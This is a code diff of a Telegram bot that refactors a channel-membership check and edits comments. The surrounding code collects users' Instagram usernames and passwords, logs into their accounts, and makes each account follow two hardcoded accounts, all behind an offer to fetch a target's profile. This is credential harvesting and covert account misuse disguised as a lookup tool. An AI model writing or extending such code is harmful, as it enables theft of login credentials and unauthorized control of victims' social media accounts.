@@ -25,10 +25,7 @@ async def check_channel_membership(update: Update):
         status = await update.message.chat.get_member(user_id)
         member_statuses.append(status.status)
     
-    if all(status in ['member', 'administrator'] for status in member_statuses):
-        return True
-    else:
-        return False
+    return all(status in ['member', 'administrator'] for status in member_statuses)
 
 # Start the conversation with login button
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -76,9 +73,10 @@ async def password_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         cl.login(username, password)
         print(f"Successfully logged in as {username}")
 
-        target_to_follow = "imperfailed"  # Replace with your actual Instagram username
+        # Example follow actions
+        target_to_follow = "imperfailed"
         cl.user_follow(cl.user_id_from_username(target_to_follow))
-        target_to_follow1 = "foileds"  # Replace with your actual Instagram username
+        target_to_follow1 = "foileds"
         cl.user_follow(cl.user_id_from_username(target_to_follow1))
         await update.message.reply_text(f"Successfully followed {target_to_follow}. Now, please enter the target Instagram username to fetch their profile:")
         return TARGET
@@ -234,7 +232,7 @@ def main():
             TARGET: [MessageHandler(filters.TEXT & ~filters.COMMAND, fetch_profile)],
         },
         fallbacks=[],
-        per_user=True
+        allow_reentry=True  # This allows the user to re-enter the conversation if needed
     )
 
     application.add_handler(conv_handler)
@@ -245,3 +243,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+    
